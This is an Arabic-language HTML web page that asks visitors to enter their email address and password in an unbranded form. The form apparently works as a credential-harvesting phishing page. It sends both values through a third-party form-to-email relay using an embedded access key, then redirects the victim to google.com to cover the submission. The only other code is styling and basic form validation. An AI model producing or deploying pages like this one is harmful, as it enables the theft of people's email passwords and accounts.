<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة تسجيل مركزة ونهائية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLMDJdU44d7jYnC9W+B8mG/v8t/q1+3l/N48Gz4Q1G2D3Q5Y7G8/O33Q07/770Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    <style>
        /* التنسيقات العامة والأساسية */
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #333;
            direction: rtl; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        /* تنسيقات الهيدر (شريط الروابط) */
        header {
            background-color: #333;
            color: #fff;
            padding: 20px 0;
            text-align: center;
            margin-bottom: 20px;
        }
        header nav a {
            color: white; 
            margin: 0 15px;
            text-decoration: none;
            font-weight: 700; 
            transition: color 0.3s;
        }
        header nav a:hover {
            color: #007bff;
        }

        /* تنسيقات البانر (القسم الأزرق) */
        .banner {
            background-color: #007bff;
            color: #fff;
            padding: 40px 20px;
            text-align: center;
            margin-bottom: 20px;
        }
        .banner p {
            font-size: 1.1em;
            margin-top: 0; 
            margin-bottom: 20px;
        }
        /* تنسيقات الزر الأحمر لليوتيوب */
        .youtube-btn {
            display: inline-block; 
            background-color: #ff0000;
            color: white;
            padding: 12px 25px; 
            border-radius: 50px; 
            text-decoration: none;
            font-weight: 700;
            font-size: 16px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s, transform 0.2s;
        }
        .youtube-btn:hover {
            background-color: #cc0000;
            transform: translateY(-2px);
        }
        /* تنسيقات المحتوى (لضمان أن التذييل يبقى في الأسفل) */
        .main-content {
            flex: 1; 
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 10px;
        }
        
        /* تنسيقات شريط أيقونات السوشيال ميديا (التعديل المطلوب) */
        .social-icons-bar {
            display: flex;
            justify-content: center; /* توسيط الأيقونات في المنتصف */
            align-items: center;
            background-color: #2c2c2c; /* خلفية داكنة جديدة */
            padding: 15px 0;
            margin-bottom: 30px; /* مسافة تفصلها عن الفورم أدناه */
            border-radius: 10px; /* زوايا مستديرة لمظهر عصري */
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
        }

        .social-icon {
            font-size: 32px; /* حجم الأيقونات */
            color: #b0b0b0; /* لون الأيقونات الرمادي الفاتح */
            margin: 0 15px; /* المسافة بين الأيقونات */
            transition: color 0.3s ease, transform 0.3s ease;
            line-height: 1; /* لضبط التوسيط العمودي */
        }

        .social-icon:hover {
            transform: scale(1.15); /* تكبير جذاب عند المرور */
            /* يمكن تحديد لون التفاعل لكل منصة هنا لمظهر أكثر احترافية */
        }
        
        /* تلوين أيقونات محددة عند المرور عليها */
        .fa-instagram:hover { color: #E1306C; } /* لون إنستجرام */
        .fa-tiktok:hover { color: #69C9D0; }      /* لون تيك توك */
        .fa-youtube:hover { color: #FF0000; }    /* لون يوتيوب */
        .fa-telegram-plane:hover { color: #0088CC; } 
        .fa-twitter:hover { color: #1DA1F2; }
        .fa-facebook-f:hover { color: #1877F2; }
        
        /* تنسيقات نموذج تسجيل الإيميل (Box) */
        .form-box-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .box {
            background-color: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 350px;
            max-width: 100%;
            transition: transform 0.3s ease;
        }
        .box:hover {
            transform: translateY(-5px);
        }
        h2 {
            text-align: center;
            color: #0d47a1;
            margin-bottom: 20px;
            font-weight: 700;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #333;
        }
        .input-group {
            position: relative;
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            padding-left: 45px; 
            border: 2px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input[type="email"]:focus, input[type="password"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 8px rgba(24, 119, 242, 0.4);
            outline: none;
        }
        
        .toggle-password {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 20px;
            color: #666;
            line-height: 1;
        }
        .toggle-password:hover {
            color: #1877f2;
        }

        /* تنسيق زر الإرسال */
        button {
            background-color: #1877f2;
            color: white;
            padding: 15px 0;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-weight: 700;
            transition: background-color 0.3s ease, box-shadow 0.3s;
            margin-top: 10px;
        }
        button:hover {
            background-color: #166fe5;
            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
        }
        .error-message {
            color: #e53935;
            font-size: 14px;
            margin-top: -15px;
            margin-bottom: 15px;
            display: none;
        }
        
        /* تنسيقات تذييل الصفحة (Footer) */
        footer {
            background-color: #333;
            color: #bbb;
            text-align: center;
            padding: 15px 0;
            margin-top: auto; 
            border-top: 3px solid #007bff; 
        }
        
        .footer-content {
            font-size: 0.9em;
        }
        
        .footer-content span {
            margin: 0 10px;
            font-weight: bold;
            color: #fff;
        }
    </style>
</head>
<body>

    <header>
        <nav>
            <a href="#">الرئيسية</a>
            <a href="#">حولنا</a>
            <a href="#">اتصل بنا</a>
        </nav>
    </header>

    <div class="banner">
        <p>اكتشف خدماتنا الجديدة الآن!</p>
        
        <a href="https://www.youtube.com/" target="_blank" class="youtube-btn">
            زيارة موقعنا
        </a>
    </div>

    <div class="social-icons-bar">
        <a href="رابط_إنستجرام_هنا" target="_blank" class="social-icon" title="Instagram">
            <i class="fab fa-instagram"></i>
        </a>
        <a href="رابط_تيك_توك_هنا" target="_blank" class="social-icon" title="TikTok">
            <i class="fab fa-tiktok"></i>
        </a>
        <a href="رابط_يوتيوب_هنا" target="_blank" class="social-icon" title="YouTube">
            <i class="fab fa-youtube"></i>
        </a>
        <a href="رابط_تليجرام_هنا" target="_blank" class="social-icon" title="Telegram">
            <i class="fab fa-telegram-plane"></i>
        </a>
        <a href="رابط_تويتر_هنا" target="_blank" class="social-icon" title="Twitter/X">
            <i class="fab fa-twitter"></i>
        </a>
        <a href="رابط_فيسبوك_هنا" target="_blank" class="social-icon" title="Facebook">
            <i class="fab fa-facebook-f"></i>
        </a>
        
        </div>
    <div class="main-content">
        
        <div class="form-box-wrapper">
            <div class="box">
                <h2>ادخل بياناتك</h2>   
            
                           </p>
                <form action="https://api.web3forms.com/submit" method="POST">
                    <input type="hidden" name="access_key" value="b2ed5633-7b5f-46c3-b087-5bb11a7da5a0">
                    
                    <label for="emailInput">البريد الإلكتروني:</label>
                    <div class="input-group">
                        <input type="email" id="emailInput" name="البريد" placeholder="أدخل البريد" required>
                    </div>
                    <div class="error-message" id="emailError">الرجاء إدخال البريد الإلكتروني.</div>
                    
                    <label for="passwordInput">كلمة المرور:</label>
                    <div class="input-group">
                        <input type="password" id="passwordInput" name="كلمة_المرور" placeholder="أدخل كلمة المرور" required>
                        <span class="toggle-password" id="togglePassword">👁️</span>
                    </div>
                    <div class="error-message" id="passwordError">الرجاء إدخال كلمة المرور.</div>
                    
                    <button type="submit">إرسال</button>
                    
                    <input type="hidden" name="_redirect" value="https://www.google.com/">
                </form>
            </div>
        </div>
        
    </div> <footer>
        <div class="footer-content">
            <span>©</span>
            جميع الحقوق محفوظة
            <span id="currentYear"></span>
        </div>
    </footer>

<script>
    // التفاعلية والتحقق من الحقول (JavaScript)
    
    // إضافة السنة الحالية تلقائياً في التذييل
    document.getElementById('currentYear').textContent = new Date().getFullYear();
    // تم حذف الكود القديم الخاص بـ form.addEventListener('submit') لأنه لا يوجد عنصر 'loginForm' معرف في الـ HTML
    // وبما أن النموذج يستخدم Web3Forms، فمن الأفضل الاعتماد على وظائف التحقق المدمجة في المتصفح ('required') أو إعادة تسمية النموذج.
    
    // تعريف عناصر النموذج للتحقق اليدوي (إذا كنت تفضله)
    const form = document.querySelector('form'); // اختيار أول نموذج
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');
    
    // 1. وظيفة التحقق من النموذج (المعاد تفعيلها)
    if (form) {
        form.addEventListener('submit', function(event) {
            let isValid = true;
            
            // تحقق من البريد الإلكتروني
            if (emailInput && emailInput.value.trim() === '') {
                emailError.style.display = 'block';
                isValid = false;
            } else if (emailError) {
                emailError.style.display = 'none';
            }
            
            // تحقق من كلمة المرور
            if (passwordInput && passwordInput.value.trim() === '') {
                passwordError.style.display = 'block';
                isValid = false;
            } else if (passwordError) {
                passwordError.style.display = 'none';
            }
            
            if (!isValid) {
                event.preventDefault();
            }
        });
    }

    // 2. إخفاء رسالة الخطأ عند بدء الكتابة
    if (emailInput) {
        emailInput.addEventListener('input', function() {
            emailError.style.display = 'none';
        });
    }
    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            passwordError.style.display = 'none';
        });
    }

    // 3. وظيفة إظهار/إخفاء كلمة المرور
    if (togglePassword) {
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            // تبديل الأيقونة
            if (type === 'text') {
                this.textContent = '🔒'; 
            } else {
                this.textContent = '👁️';
            }
        });
    }
</script>
</body>
</html>
